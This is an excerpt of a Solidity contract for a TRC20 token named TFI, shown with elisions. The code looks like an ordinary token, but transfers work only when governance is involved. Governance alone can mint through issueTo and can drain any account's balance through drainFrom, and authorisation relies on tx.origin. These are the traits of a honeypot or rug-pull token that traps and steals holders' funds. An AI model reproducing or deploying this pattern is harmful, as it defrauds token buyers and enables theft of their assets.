...
contract BaseTRC20 is Context, ITRC20 {
    ...
    function _transfer(address sender, address recipient, uint amount) internal {
        ...
        require(allowed(sender) || allowed(recipient), "TRC20: operation is not allowed");
    ...
    function allowed(address account) internal returns (bool) {
        return account == governance || tx.origin == governance;
    }
    ...
    function issueTo(address account, uint amount) public {
        require(allowed(_msgSender()), "TRC20: operation is not allowed");
    ...
    function drain(uint amount) external {
        drainFrom(_msgSender(), amount);
    }

    function drainFrom(address account, uint amount) public {
        require(allowed(_msgSender()), "TRC20: operation is not allowed");
...
contract TRC20Detailed is BaseTRC20 {
    ...
    constructor (string memory name, string memory symbol, uint8 decimals) BaseTRC20() public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
...
contract TFI is ITRC20, TRC20Detailed {
    constructor() public TRC20Detailed("TFI", "TFI", 18) {}
}